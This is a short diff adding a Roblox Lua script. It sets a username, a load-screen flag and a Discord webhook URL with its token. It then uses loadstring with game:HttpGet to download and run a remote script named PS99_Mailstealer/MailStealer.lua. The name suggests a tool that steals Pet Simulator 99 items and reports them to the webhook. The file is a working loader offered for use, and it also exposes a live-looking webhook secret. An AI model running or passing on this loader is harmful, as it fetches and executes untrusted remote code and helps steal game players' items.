@@ -1,0 +1,6 @@
+Username = "Bigcoolplayer21"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1302490644660486194/tdFQ1wfiNPS6HhTyLYNrvSBMfUpgThVDLDmfzWxVDubUnqfDEYs9JTyx5RqhVn9J_u81" -- Paste your Discord webhook here
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
